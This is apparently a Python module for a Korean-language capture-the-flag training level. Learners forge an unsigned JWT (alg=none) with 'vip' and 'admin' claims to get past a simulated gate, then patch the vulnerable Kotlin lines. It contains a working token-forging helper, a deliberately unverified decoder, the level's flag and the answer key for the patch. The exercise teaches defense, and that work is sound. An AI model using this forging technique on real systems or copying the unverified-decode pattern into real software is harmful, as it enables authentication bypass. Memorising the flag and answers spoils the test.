from __future__ import annotations

import base64
import json
import re
import shlex
from typing import Any, Dict, Tuple

from .level2_3 import issue_dispatch_token


LEVEL2_4_FLAG = "FLAG{JWT_SIGNATURE_MATTERS}"
DEFAULT_SIGNAL_ID = "SIG-1004"


STATIC: Dict[str, Any] = {
    "id": "level2_4",
    "level": 2,
    "title": "2-4 Express Forge",
    "summary": "서명 검증 없이 decode한 token claim은 위조 가능한 우선 통행권이다.",
    "description": (
        "미션: standard dispatch_token을 VIP pass로 위조해 Express Gate가 "
        "검증되지 않은 token claim을 신뢰하는지 확인해라."
    ),
    "status": {"attack": "available", "defense": "locked"},
    "attack": {
        "hints": [
            {"platform": "all", "text": "Dispatch 엔드포인트에서 standard dispatch_token을 다시 발급받아."},
            {"platform": "all", "text": "원본 token을 Authorization Bearer로 Express Gate에 보내 거부 응답을 먼저 확인해."},
            {"platform": "all", "text": "jwt-decode로 payload의 tier와 role claim을 확인해."},
            {"platform": "all", "text": "서버가 signature를 검증하지 않으면 payload 변경을 막지 못한다."},
            {"platform": "all", "text": "alg=none과 빈 signature를 받아들이는지 의심해."},
            {
                "platform": "windows",
                "text": 'curl.exe -i -X POST http://localhost:8000/api/v1/challenges/level2_4/actions/express -H "Authorization: Bearer <forged_token>"',
            },
            {
                "platform": "unix",
                "text": 'curl -i -X POST http://localhost:8000/api/v1/challenges/level2_4/actions/express -H "Authorization: Bearer <forged_token>"',
            },
            {"platform": "app", "text": "터미널에서 jwt-forge-none <token> 으로 학습용 위조 토큰을 만들 수 있어."},
        ],
        "terminal": {
            "enabled": True,
            "prompt": "$ ",
            "maxOutputBytes": 12000,
            "help": (
                "Allowed:\n"
                "  echo $DISPATCH_TOKEN\n"
                "  curl -i -X POST /api/v1/challenges/level2_3/actions/dispatch -H \"Content-Type: application/json\" -d '{\"signalId\":\"SIG-1004\"}'\n"
                "  jwt-decode <token>\n"
                "  curl -i -X POST /api/v1/challenges/level2_4/actions/express -H \"Authorization: Bearer <token>\"\n"
                "Forge helper is classified. Use mission hints if stuck."
            ),
        },
        "flagFormat": "FLAG{...}",
    },
    "defense": {
        "enabled": False,
        "instruction": (
            "Express Gate는 token payload의 tier와 role claim을 우선 통행권으로 사용하고 있습니다. "
            "문제는 claim을 읽는 것이 아니라, signature 검증 없이 읽은 claim을 신뢰하는 것입니다. "
            "decode-only 처리, alg=none 신뢰, 검증되지 않은 claim 기반 권한 부여를 봉쇄하세요."
        ),
        "code": {
            "language": "kotlin",
            "patchMode": "toggleComment",
            "lines": [
                {"no": 1, "text": "fun enterExpressLane(authHeader: String, session: Session) {"},
                {"no": 2, "text": "  val token = extractBearer(authHeader)", "patchableId": "d1"},
                {"no": 3, "text": "  val decoded = jwt.decodeWithoutVerify(token)", "patchableId": "p1"},
                {"no": 4, "text": '  if (decoded.header.alg == "none") decoded.markTrusted()', "patchableId": "p2"},
                {"no": 5, "text": '  val tier = decoded.payload["tier"]', "patchableId": "d2"},
                {"no": 6, "text": '  val role = decoded.payload["role"]', "patchableId": "d3"},
                {"no": 7, "text": '  val signalId = decoded.payload["signalId"]', "patchableId": "d4"},
                {"no": 8, "text": '  if (tier == "vip" || role == "admin") grantExpressLane(signalId)', "patchableId": "p3"},
                {"no": 9, "text": '  audit.log("express gate evaluated")', "patchableId": "d5"},
                {"no": 10, "text": "}"},
            ],
        },
    },
}

PATCHABLE_IDS = {"p1", "p2", "p3", "d1", "d2", "d3", "d4", "d5"}
REQUIRED_PATCH_IDS = {"p1", "p2", "p3"}

PATCH_CORRECT_FEEDBACK = {
    "p1": "3번은 봉쇄 대상이 맞아. payload를 읽는 것만으로는 신뢰할 수 없어. decode와 verify는 달라.",
    "p2": "4번은 봉쇄 대상이 맞아. alg=none을 trusted로 처리하면 서명이 없는 token도 통과할 수 있어.",
    "p3": "8번은 봉쇄 대상이 맞아. 검증되지 않은 tier/role claim이 Express 권한 판단에 쓰이고 있어.",
}
PATCH_WRONG_FEEDBACK = {
    "d1": "2번은 안전해. Bearer token을 추출하는 것 자체는 문제가 아니야.",
    "d2": "5번은 안전해. tier claim을 읽는 것 자체가 문제가 아니라, 검증 없이 권한으로 신뢰하는 순간이 문제야.",
    "d3": "6번은 안전해. role claim도 읽기만 해서는 취약점의 핵심이 아니야.",
    "d4": "7번은 안전해. signalId는 대상 식별 claim이고, 권한을 직접 부여하는 분기는 아니야.",
    "d5": "9번은 안전해. 평가가 끝났다는 감사 로그는 token claim을 신뢰하지 않아.",
}


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")


def _b64url_decode(raw: str) -> bytes:
    padded = raw + ("=" * ((4 - (len(raw) % 4)) % 4))
    return base64.urlsafe_b64decode(padded.encode("utf-8"))


def _normalize_curl_line(command: str) -> str:
    return re.sub(r"\\\s+", " ", command.strip())


def _dispatch_env_token() -> str:
    return issue_dispatch_token(DEFAULT_SIGNAL_ID, include_evidence=False)


def _expand_env_vars(cmdline: str) -> str:
    token = _dispatch_env_token()
    return cmdline.replace("${DISPATCH_TOKEN}", token).replace("$DISPATCH_TOKEN", token)


def _parse_dispatch_payload(cmdline: str) -> Dict[str, Any]:
    parts = shlex.split(cmdline)
    data_key = None
    for candidate in ("--data", "--data-raw", "-d"):
        if candidate in parts:
            data_key = candidate
            break
    if not data_key:
        return {"signalId": DEFAULT_SIGNAL_ID}
    idx = parts.index(data_key)
    if idx + 1 >= len(parts):
        return {"signalId": DEFAULT_SIGNAL_ID}
    return json.loads(parts[idx + 1])


def decode_jwt_unsafe(token: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT 형식 오류: header.payload.signature 구조여야 함")

    header_raw = _b64url_decode(parts[0]).decode("utf-8")
    payload_raw = _b64url_decode(parts[1]).decode("utf-8")
    header = json.loads(header_raw)
    payload = json.loads(payload_raw)

    # 의도적 취약점: signature/alg를 검증하지 않고 payload를 신뢰
    return header, payload


def _extract_bearer_from_curl(cmdline: str) -> str:
    parts = shlex.split(cmdline)
    for i, part in enumerate(parts):
        if part not in ("-H", "--header"):
            continue
        if i + 1 >= len(parts):
            continue
        raw_header = parts[i + 1]
        if ":" not in raw_header:
            continue
        key, value = raw_header.split(":", 1)
        if key.strip().lower() != "authorization":
            continue
        value = value.strip()
        if value.lower().startswith("bearer "):
            return value.split(" ", 1)[1].strip()
    return ""


def _forge_none_token(base_token: str) -> str:
    _, payload = decode_jwt_unsafe(base_token)
    payload.pop("evidenceShard", None)
    payload.pop("debug", None)
    payload["tier"] = "vip"
    payload["role"] = "admin"
    forged_header = {"alg": "none", "typ": "JWT"}
    head = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
    body = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{head}.{body}."


def _express_visible_claims(payload: Dict[str, Any]) -> Dict[str, Any]:
    allowed_keys = ("signalId", "route", "state", "tier", "role", "note")
    return {key: payload[key] for key in allowed_keys if key in payload}


def evaluate_express_access(token: str) -> Tuple[bool, Dict[str, Any]]:
    header, payload = decode_jwt_unsafe(token)
    tier = str(payload.get("tier", "")).strip().lower()
    role = str(payload.get("role", "")).strip().lower()
    return (tier == "vip" or role == "admin"), {"header": header, "payload": _express_visible_claims(payload)}


def check_flag(flag: str) -> bool:
    return flag.strip() == LEVEL2_4_FLAG


def judge_patch(patched_ids: list[str]) -> bool:
    return set(patched_ids) == REQUIRED_PATCH_IDS


def judge_patch_with_session(patched_ids: list[str], session: Dict[str, Any]) -> bool:
    return set(patched_ids) == REQUIRED_PATCH_IDS


def patch_feedback(patched_ids: list[str]) -> str:
    selected = set(patched_ids)
    messages: list[str] = []
    seen: set[str] = set()

    for pid in patched_ids:
        if pid in seen:
            continue
        seen.add(pid)
        if pid in PATCH_CORRECT_FEEDBACK:
            messages.append(PATCH_CORRECT_FEEDBACK[pid])
        elif pid in PATCH_WRONG_FEEDBACK:
            messages.append(PATCH_WRONG_FEEDBACK[pid])

    if REQUIRED_PATCH_IDS - selected:
        messages.append(
            "아직 검증되지 않은 token claim 신뢰 경로가 남아있어. payload를 읽는 단계, alg 정책, "
            "권한 부여 분기가 모두 서버 기준으로 검증되는지 확인해."
        )

    return " ".join(messages) if messages else "봉쇄할 라인을 선택해줘. decode와 verify의 차이, alg 정책, 권한 부여 분기를 같이 봐야 해."


def terminal_exec(command: str) -> Tuple[str, str, int]:
    cmdline = _normalize_curl_line(command)
    if not cmdline:
        return "", "", 0

    if cmdline in ("echo $DISPATCH_TOKEN", "printenv DISPATCH_TOKEN"):
        return f"{_dispatch_env_token()}\n", "", 0
    if cmdline in ("env", "printenv"):
        return f"DISPATCH_TOKEN={_dispatch_env_token()}\n", "", 0

    if cmdline in ("help", "?", "h"):
        return (
            "Allowed:\n"
            "  curl -i -X POST /api/v1/challenges/level2_3/actions/dispatch -H \"Content-Type: application/json\" -d '{\"signalId\":\"SIG-1004\"}'\n"
            "  jwt-decode <token>\n"
            "  curl -i -X POST /api/v1/challenges/level2_4/actions/express -H \"Authorization: Bearer <token>\"\n"
            "Forge helper is classified. Use mission hints if stuck.\n"
        ), "", 0

    if cmdline.startswith("curl.exe "):
        cmdline = "curl " + cmdline[len("curl.exe ") :]

    cmdline = _expand_env_vars(cmdline)

    if cmdline.startswith("jwt-decode "):
        token = cmdline[len("jwt-decode ") :].strip()
        if not token:
            return "", "usage: jwt-decode <token>", 1
        try:
            header, payload = decode_jwt_unsafe(token)
            pretty = json.dumps({"header": header, "payload": payload}, ensure_ascii=False, indent=2)
            return f"{pretty}\n", "", 0
        except Exception as exc:
            return "", f"decode error: {exc}", 1

    if cmdline.startswith("jwt-forge-none "):
        token = cmdline[len("jwt-forge-none ") :].strip()
        if not token:
            return "", "usage: jwt-forge-none <token>", 1
        try:
            forged = _forge_none_token(token)
            return f"{forged}\n", "", 0
        except Exception as exc:
            return "", f"forge error: {exc}", 1

    if cmdline.startswith("curl "):
        if "actions/dispatch" in cmdline:
            try:
                req = _parse_dispatch_payload(cmdline)
                signal_id = str(req.get("signalId") or req.get("parcel_id") or DEFAULT_SIGNAL_ID)
            except Exception:
                signal_id = DEFAULT_SIGNAL_ID
            token = issue_dispatch_token(signal_id, include_evidence=False)
            body = json.dumps({"ok": True, "dispatch_token": token}, separators=(",", ":"))
            if "-i" in shlex.split(cmdline) or "-v" in shlex.split(cmdline):
                return (
                    "> POST /api/v1/challenges/level2_3/actions/dispatch HTTP/1.1\n"
                    f"> payload: {json.dumps({'signalId': signal_id}, separators=(',', ':'))}\n"
                    "<\n"
                    "< HTTP/1.1 200 OK\n"
                    "< x-dispatch-trace: capsule-issued\n"
                    f"{body}\n"
                ), "", 0
            return f"{body}\n", "", 0

        if "actions/express" in cmdline:
            token = _extract_bearer_from_curl(cmdline)
            if not token:
                return "", 'Authorization 헤더가 필요해. 예: -H "Authorization: Bearer <token>"', 1
            try:
                allowed, detail = evaluate_express_access(token)
            except Exception as exc:
                return "", f"token parse error: {exc}", 1
            if allowed:
                body = json.dumps(
                    {
                        "status": "ok",
                        "lane": "express",
                        "flag": LEVEL2_4_FLAG,
                        "claims": detail["payload"],
                    },
                    separators=(",", ":"),
                )
                if "-i" in shlex.split(cmdline) or "-v" in shlex.split(cmdline):
                    return (
                        "> POST /api/v1/challenges/level2_4/actions/express HTTP/1.1\n"
                        "<\n"
                        "< HTTP/1.1 200 OK\n"
                        "< x-express-gate: forged-pass-accepted\n"
                        f"{body}\n"
                    ), "", 0
                return f"{body}\n", "", 0
            body = json.dumps(
                {
                    "status": "denied",
                    "lane": "standard",
                    "message": "VIP token required",
                    "claims": detail["payload"],
                },
                separators=(",", ":"),
            )
            if "-i" in shlex.split(cmdline) or "-v" in shlex.split(cmdline):
                return (
                    "> POST /api/v1/challenges/level2_4/actions/express HTTP/1.1\n"
                    "<\n"
                    "< HTTP/1.1 403 Forbidden\n"
                    "< x-express-gate: standard-token-denied\n"
                    f"{body}\n"
                ), "", 0
            return f"{body}\n", "", 0

    return "", f"command not found: {cmdline}", 127
